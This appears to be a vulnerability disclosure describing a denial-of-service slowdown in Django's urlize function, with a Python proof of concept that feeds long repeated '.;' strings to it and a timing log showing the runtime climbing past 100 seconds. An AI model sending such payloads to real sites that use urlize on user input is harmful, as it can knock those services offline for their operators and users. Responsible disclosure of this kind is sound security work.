## Vulnerability Information
I reported a slow pattern in urlize using repeated `.;` characters, which would become exponentially slower the larger the string.
If a user string from a POST request was read by the function, or stored into the database to be read later by urlize, that's where the biggest problems happened.

This is the PoC that I used:
```py
import django.utils.html
from time import time

print('=== django.utils.html.urlize(".;" * n) ===')
for i in range(0,1000000, 40000):
    start = time()
    PAYLOAD = ".;" * i
    django.utils.html.urlize(PAYLOAD)
    print(len(PAYLOAD), "\t", time() - start)
```
```
=== django.utils.html.urlize(".;" * n) ===
80000     0.517104148864746
160000    1.91546583175659

800000    59.8330779075623
880000    74.544540643692
960000    90.4768784046173
1040000   106.528100728989
```

## Impact

Reduced performance or Denial of Service was possible if the urlize function was used without strict limits on a large user string.
